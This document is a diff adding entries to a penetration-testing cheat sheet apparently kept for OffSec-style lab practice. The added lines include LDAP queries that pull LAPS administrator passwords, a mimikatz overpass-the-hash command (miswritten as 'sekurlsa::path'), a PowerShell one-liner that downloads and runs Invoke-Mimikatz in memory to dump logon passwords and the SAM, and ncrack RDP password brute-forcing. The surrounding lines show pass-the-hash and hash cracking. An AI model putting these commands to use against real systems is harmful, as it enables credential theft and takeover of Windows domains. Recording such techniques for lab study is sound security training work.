@@ -292,6 +292,11 @@ Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redi
 
 * `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`
 
+## LDAP enumeration
+
+* ldapsearch (can also add -v for verbosity): `ldapsearch -x -H ldap://192.168.111.121 -D '' -w '' -b "DC=hank,DC=offs"`
+* ldapsearch (when password is known): `ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w <PASSWORD HERE> -b "DC=hutch,DC=offsec" -H ldap://192.168.111.109 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
+
 ## metasploit
 
 * port forward: `portfwd add -L 0.0.0.0 -l 8888 -p 8080 -r 127.0.0.1`
@@ -321,6 +326,10 @@ Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redi
 If you need to generate a nice html report from the output you can use *_xsltproc_*:
 
 * `sudo xsltproc final_discovery.xml -o nmap_DATE_TARGET.html`
+
+## overpass-the-hash
+
+* get the bill_admin's hash then use it to open up a new PowerShell prompt as him with mimikatz: `sekurlsa::path /user:bill_admin /domain:corp.com /ntlm:<NTLM hash> /run:PowerShell.exe`
 
 ## pass-the-hash
 * pass-the-hash attack for Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`
@@ -372,6 +381,12 @@ If you are interested in more depth on this matter check out the cyberchef's web
 * port scan:
 	* on target: `(21,22,80,443) | % {powercat -c <target IP> -p $_ -t 1 -Verbose -d}`
 
+## PowerShell
+
+* downloadstring: `IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')`
+* after download: `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" lsadump::sam" "exit"'`
+* the above command invocation can be executed directly by putting it as the last line in the Invoke-Mimikatz.ps1 script
+
 ## public IP from terminal
 
 * `dig +short myip.opendns.com @resolver1.opendns.com`
@@ -382,9 +397,12 @@ If you are interested in more depth on this matter check out the cyberchef's web
 
 * `sudo echo '<192.168.0.23> <retrowerb.htb>' | tee -a /etc/hosts`
 
-## RDP (rdesktop) with local file share
+## RDP
 
-* `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`
+* (rdesktop) with local file share:
+	* `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`
+* cracking RDP password (ncrack):
+	* `ncrack -vv --user <USERNAME> -P /usr/share/wordlists/rockyou.txt`
 
 ## Restricted traffic bypass
 
